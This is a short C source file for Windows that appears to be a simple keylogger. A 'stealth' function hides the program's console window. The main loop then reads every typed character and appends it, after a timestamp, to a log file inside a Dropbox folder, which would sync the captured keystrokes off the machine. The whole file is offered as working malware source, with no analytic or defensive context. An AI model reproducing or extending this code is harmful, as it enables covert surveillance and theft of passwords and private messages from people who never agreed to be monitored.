#include<stdio.h>
#include<time.h>
#include<windows.h>
void stealth() //works in stealth mode
    {
      HWND stealth;
      AllocConsole();
      stealth = FindWindowA("ConsoleWindowClass", NULL);
      ShowWindow(stealth,0);
    }
int main()
{
    FILE *fp=fopen("Z://DropBox/009log.txt","a+");
    char ch;
    time_t rawtime=time(NULL);
    
    stealth();
    fflush(stdin);
    fprintf (fp,"\n_______________________________________________________________________________\nTIME:%s\n",ctime(&rawtime));
    fclose(fp);

    
    while(1)
    {
        
       ch=getch();
       fp=fopen("Z://DropBox/009log.txt","a+");
       fprintf(fp,"%c",ch);
       fclose(fp);
       
    }
      
    return 0;
}
    


